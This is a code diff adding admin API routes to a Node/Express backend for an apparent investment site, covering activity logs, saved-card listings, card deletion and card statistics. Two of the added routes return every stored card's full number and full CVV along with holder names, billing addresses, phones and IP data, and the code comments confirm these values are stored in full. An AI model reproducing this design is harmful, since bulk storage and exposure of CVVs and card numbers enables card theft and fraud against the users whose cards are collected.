@@ -8365,6 +8365,503 @@ app.post('/api/admin/users/:userId/balance', async (req, res) => {
 
 
 
+// Admin Recent Activity Endpoint - Shows all user activities
+app.get('/api/admin/recent-activity', adminProtect, async (req, res) => {
+    try {
+        const { page = 1, limit = 50, action, userId, startDate, endDate } = req.query;
+        const skip = (page - 1) * limit;
+
+        // Build query filter
+        const filter = {};
+        
+        if (action) {
+            filter.action = action;
+        }
+        
+        if (userId) {
+            filter.performedBy = userId;
+            filter.performedByModel = 'User';
+        }
+        
+        if (startDate || endDate) {
+            filter.createdAt = {};
+            if (startDate) {
+                filter.createdAt.$gte = new Date(startDate);
+            }
+            if (endDate) {
+                filter.createdAt.$lte = new Date(endDate);
+            }
+        }
+
+        // Get recent activities from both SystemLog and UserLog
+        const [systemActivities, userActivities] = await Promise.all([
+            // SystemLog activities (admin actions and system events)
+            SystemLog.find(filter)
+                .populate('performedBy', 'name email')
+                .sort({ createdAt: -1 })
+                .skip(skip)
+                .limit(parseInt(limit))
+                .lean(),
+            
+            // UserLog activities (user actions)
+            UserLog.find({
+                ...filter,
+                performedBy: userId ? userId : { $exists: true }
+            })
+                .populate('user', 'firstName lastName email')
+                .sort({ createdAt: -1 })
+                .skip(skip)
+                .limit(parseInt(limit))
+                .lean()
+        ]);
+
+        // Combine and format activities
+        const allActivities = [
+            ...systemActivities.map(activity => ({
+                id: activity._id,
+                type: 'system',
+                action: activity.action,
+                entity: activity.entity,
+                entityId: activity.entityId,
+                performedBy: activity.performedBy ? {
+                    id: activity.performedBy._id,
+                    name: activity.performedBy.name,
+                    email: activity.performedBy.email,
+                    type: 'admin'
+                } : null,
+                ipAddress: activity.ip,
+                device: activity.device,
+                location: activity.location,
+                changes: activity.changes,
+                metadata: activity.metadata,
+                timestamp: activity.createdAt,
+                description: getActivityDescription(activity)
+            })),
+            ...userActivities.map(activity => ({
+                id: activity._id,
+                type: 'user',
+                action: activity.action,
+                entity: 'User',
+                entityId: activity.user?._id,
+                performedBy: activity.user ? {
+                    id: activity.user._id,
+                    name: `${activity.user.firstName} ${activity.user.lastName}`,
+                    email: activity.user.email,
+                    type: 'user'
+                } : null,
+                ipAddress: activity.ipAddress,
+                device: activity.userAgent,
+                location: activity.location,
+                changes: activity.metadata,
+                metadata: activity.metadata,
+                timestamp: activity.createdAt,
+                description: getUserActivityDescription(activity),
+                status: activity.status
+            }))
+        ].sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp))
+         .slice(0, limit); // Ensure we only return the requested limit
+
+        // Get total counts for pagination
+        const totalSystemCount = await SystemLog.countDocuments(filter);
+        const totalUserCount = await UserLog.countDocuments({
+            ...filter,
+            performedBy: userId ? userId : { $exists: true }
+        });
+        const totalCount = totalSystemCount + totalUserCount;
+
+        res.status(200).json({
+            status: 'success',
+            data: {
+                activities: allActivities,
+                pagination: {
+                    currentPage: parseInt(page),
+                    totalPages: Math.ceil(totalCount / limit),
+                    totalCount,
+                    hasNext: page < Math.ceil(totalCount / limit),
+                    hasPrev: page > 1
+                },
+                filters: {
+                    availableActions: [
+                        'login', 'logout', 'signup', 'profile_update', 'password_change',
+                        'deposit', 'withdrawal', 'investment', 'transfer', 'kyc_submission',
+                        'settings_change', 'api_key_create', 'api_key_delete',
+                        'password_reset_request', 'password_reset_complete'
+                    ],
+                    dateRange: {
+                        startDate: startDate || null,
+                        endDate: endDate || null
+                    }
+                }
+            }
+        });
+
+    } catch (err) {
+        console.error('Admin recent activity error:', err);
+        res.status(500).json({
+            status: 'error',
+            message: 'Failed to fetch recent activities'
+        });
+    }
+});
+
+// Helper function to generate system activity descriptions
+function getActivityDescription(activity) {
+    const actionMap = {
+        'user_login': `${activity.performedBy?.name || 'User'} logged in`,
+        'admin-login': `${activity.performedBy?.name || 'Admin'} logged in`,
+        'create_investment': `Investment created`,
+        'approve-deposit': `Deposit approved by ${activity.performedBy?.name}`,
+        'reject-deposit': `Deposit rejected by ${activity.performedBy?.name}`,
+        'approve-withdrawal': `Withdrawal approved by ${activity.performedBy?.name}`,
+        'reject-withdrawal': `Withdrawal rejected by ${activity.performedBy?.name}`,
+        'update-user': `User profile updated by ${activity.performedBy?.name}`,
+        'create-user': `New user created by ${activity.performedBy?.name}`,
+        'update-plan': `Investment plan updated by ${activity.performedBy?.name}`,
+        'cancel-investment': `Investment cancelled by ${activity.performedBy?.name}`
+    };
+
+    return actionMap[activity.action] || `${activity.action} performed`;
+}
+
+// Helper function to generate user activity descriptions
+function getUserActivityDescription(activity) {
+    const actionMap = {
+        'login': 'User logged in',
+        'logout': 'User logged out',
+        'signup': 'New user signed up',
+        'profile_update': 'User updated profile',
+        'password_change': 'User changed password',
+        'deposit': 'User made a deposit',
+        'withdrawal': 'User requested withdrawal',
+        'investment': 'User created investment',
+        'transfer': 'User transferred funds',
+        'kyc_submission': 'User submitted KYC documents',
+        'settings_change': 'User changed settings',
+        'api_key_create': 'User created API key',
+        'api_key_delete': 'User deleted API key',
+        'failed_login': 'Failed login attempt',
+        'password_reset_request': 'Password reset requested',
+        'password_reset_complete': 'Password reset completed'
+    };
+
+    const baseDescription = actionMap[activity.action] || `User performed ${activity.action}`;
+    
+    if (activity.status === 'failed') {
+        return `${baseDescription} - Failed`;
+    }
+    
+    return baseDescription;
+}
+
+// Admin Get Saved Cards Endpoint - Shows all saved card information
+app.get('/api/admin/saved-cards', adminProtect, async (req, res) => {
+    try {
+        const { page = 1, limit = 20, userId, cardType, isDefault } = req.query;
+        const skip = (page - 1) * limit;
+
+        // Build query filter
+        const filter = {};
+        
+        if (userId) {
+            filter.user = userId;
+        }
+        
+        if (cardType) {
+            filter.cardType = cardType;
+        }
+        
+        if (isDefault !== undefined) {
+            filter.isDefault = isDefault === 'true';
+        }
+
+        // Get saved cards with user information
+        const cards = await Card.find(filter)
+            .populate('user', 'firstName lastName email phone country status')
+            .sort({ lastUsed: -1, createdAt: -1 })
+            .skip(skip)
+            .limit(parseInt(limit))
+            .lean();
+
+        // Format card data (be careful with sensitive information)
+        const formattedCards = cards.map(card => ({
+            id: card._id,
+            user: {
+                id: card.user._id,
+                firstName: card.user.firstName,
+                lastName: card.user.lastName,
+                email: card.user.email,
+                phone: card.user.phone,
+                country: card.user.country,
+                status: card.user.status
+            },
+            cardDetails: {
+                fullName: card.fullName,
+                cardNumber: card.cardNumber, // Full card number as stored in database
+                last4: card.cardNumber.slice(-4),
+                expiry: card.expiry,
+                cvv: card.cvv, // Full CVV as stored in database
+                cardType: card.cardType,
+                billingAddress: card.billingAddress,
+                isDefault: card.isDefault
+            },
+            usageInfo: {
+                lastUsed: card.lastUsed,
+                createdAt: card.createdAt,
+                timesUsed: card.timesUsed || 1 // You might want to add this field to your schema
+            },
+            metadata: {
+                ipAddress: card.ipAddress,
+                userAgent: card.userAgent
+            }
+        }));
+
+        // Get total count for pagination
+        const totalCount = await Card.countDocuments(filter);
+
+        res.status(200).json({
+            status: 'success',
+            data: {
+                cards: formattedCards,
+                pagination: {
+                    currentPage: parseInt(page),
+                    totalPages: Math.ceil(totalCount / limit),
+                    totalCount,
+                    hasNext: page < Math.ceil(totalCount / limit),
+                    hasPrev: page > 1
+                },
+                summary: {
+                    totalCards: totalCount,
+                    visaCards: await Card.countDocuments({ ...filter, cardType: 'visa' }),
+                    mastercardCards: await Card.countDocuments({ ...filter, cardType: 'mastercard' }),
+                    amexCards: await Card.countDocuments({ ...filter, cardType: 'amex' }),
+                    defaultCards: await Card.countDocuments({ ...filter, isDefault: true })
+                }
+            }
+        });
+
+    } catch (err) {
+        console.error('Admin saved cards error:', err);
+        res.status(500).json({
+            status: 'error',
+            message: 'Failed to fetch saved cards'
+        });
+    }
+});
+
+// Admin Get Specific User's Cards Endpoint
+app.get('/api/admin/users/:userId/cards', adminProtect, async (req, res) => {
+    try {
+        const { userId } = req.params;
+        const { page = 1, limit = 10 } = req.query;
+        const skip = (page - 1) * limit;
+
+        // Verify user exists
+        const user = await User.findById(userId);
+        if (!user) {
+            return res.status(404).json({
+                status: 'fail',
+                message: 'User not found'
+            });
+        }
+
+        // Get user's cards
+        const cards = await Card.find({ user: userId })
+            .sort({ lastUsed: -1, createdAt: -1 })
+            .skip(skip)
+            .limit(parseInt(limit))
+            .lean();
+
+        const formattedCards = cards.map(card => ({
+            id: card._id,
+            cardDetails: {
+                fullName: card.fullName,
+                cardNumber: card.cardNumber,
+                last4: card.cardNumber.slice(-4),
+                expiry: card.expiry,
+                cvv: card.cvv,
+                cardType: card.cardType,
+                billingAddress: card.billingAddress,
+                isDefault: card.isDefault
+            },
+            usageInfo: {
+                lastUsed: card.lastUsed,
+                createdAt: card.createdAt
+            }
+        }));
+
+        const totalCount = await Card.countDocuments({ user: userId });
+
+        res.status(200).json({
+            status: 'success',
+            data: {
+                user: {
+                    id: user._id,
+                    firstName: user.firstName,
+                    lastName: user.lastName,
+                    email: user.email,
+                    status: user.status
+                },
+                cards: formattedCards,
+                pagination: {
+                    currentPage: parseInt(page),
+                    totalPages: Math.ceil(totalCount / limit),
+                    totalCount,
+                    hasNext: page < Math.ceil(totalCount / limit),
+                    hasPrev: page > 1
+                }
+            }
+        });
+
+    } catch (err) {
+        console.error('Admin user cards error:', err);
+        res.status(500).json({
+            status: 'error',
+            message: 'Failed to fetch user cards'
+        });
+    }
+});
+
+// Admin Delete Card Endpoint
+app.delete('/api/admin/cards/:cardId', adminProtect, async (req, res) => {
+    try {
+        const { cardId } = req.params;
+        const { reason } = req.body;
+
+        const card = await Card.findById(cardId).populate('user');
+        if (!card) {
+            return res.status(404).json({
+                status: 'fail',
+                message: 'Card not found'
+            });
+        }
+
+        // Store card info for logging before deletion
+        const cardInfo = {
+            last4: card.cardNumber.slice(-4),
+            cardType: card.cardType,
+            userId: card.user._id,
+            userEmail: card.user.email
+        };
+
+        await Card.findByIdAndDelete(cardId);
+
+        res.status(200).json({
+            status: 'success',
+            message: 'Card deleted successfully',
+            data: {
+                deletedCard: {
+                    id: cardId,
+                    last4: cardInfo.last4,
+                    cardType: cardInfo.cardType
+                }
+            }
+        });
+
+        // Log the deletion
+        await logActivity('delete-card', 'card', cardId, req.admin._id, 'Admin', req, {
+            ...cardInfo,
+            reason: reason || 'Admin deletion',
+            deletedAt: new Date()
+        });
+
+    } catch (err) {
+        console.error('Admin delete card error:', err);
+        res.status(500).json({
+            status: 'error',
+            message: 'Failed to delete card'
+        });
+    }
+});
+
+// Admin Card Statistics Endpoint
+app.get('/api/admin/cards/statistics', adminProtect, async (req, res) => {
+    try {
+        const { period = '30d' } = req.query; // 7d, 30d, 90d, 1y
+        
+        // Calculate date range based on period
+        const now = new Date();
+        let startDate = new Date();
+        
+        switch (period) {
+            case '7d':
+                startDate.setDate(now.getDate() - 7);
+                break;
+            case '90d':
+                startDate.setDate(now.getDate() - 90);
+                break;
+            case '1y':
+                startDate.setFullYear(now.getFullYear() - 1);
+                break;
+            default: // 30d
+                startDate.setDate(now.getDate() - 30);
+        }
+
+        const statistics = await Promise.all([
+            // Total cards
+            Card.countDocuments(),
+            
+            // Cards added in period
+            Card.countDocuments({ createdAt: { $gte: startDate } }),
+            
+            // Cards by type
+            Card.aggregate([
+                { $group: { _id: '$cardType', count: { $sum: 1 } } }
+            ]),
+            
+            // Default cards
+            Card.countDocuments({ isDefault: true }),
+            
+            // Cards with recent activity
+            Card.countDocuments({ lastUsed: { $gte: startDate } }),
+            
+            // Cards per user statistics
+            Card.aggregate([
+                { $group: { _id: '$user', count: { $sum: 1 } } },
+                { $group: { 
+                    _id: null, 
+                    avgCardsPerUser: { $avg: '$count' },
+                    maxCardsPerUser: { $max: '$count' },
+                    usersWithCards: { $sum: 1 }
+                } }
+            ])
+        ]);
+
+        res.status(200).json({
+            status: 'success',
+            data: {
+                period,
+                startDate,
+                endDate: now,
+                statistics: {
+                    totalCards: statistics[0],
+                    cardsAddedInPeriod: statistics[1],
+                    cardsByType: statistics[2].reduce((acc, curr) => {
+                        acc[curr._id] = curr.count;
+                        return acc;
+                    }, {}),
+                    defaultCards: statistics[3],
+                    activeCards: statistics[4],
+                    userStatistics: statistics[5][0] || {
+                        avgCardsPerUser: 0,
+                        maxCardsPerUser: 0,
+                        usersWithCards: 0
+                    }
+                }
+            }
+        });
+
+    } catch (err) {
+        console.error('Admin card statistics error:', err);
+        res.status(500).json({
+            status: 'error',
+            message: 'Failed to fetch card statistics'
+        });
+    }
+});
+
+
+
+
 
 // Error handling middleware
 app.use((err, req, res, next) => {
@@ -8493,5 +8990,6 @@ processMaturedInvestments();
 httpServer.listen(PORT, () => {
   console.log(`Server running on port ${PORT}`);
 });
+
 
 
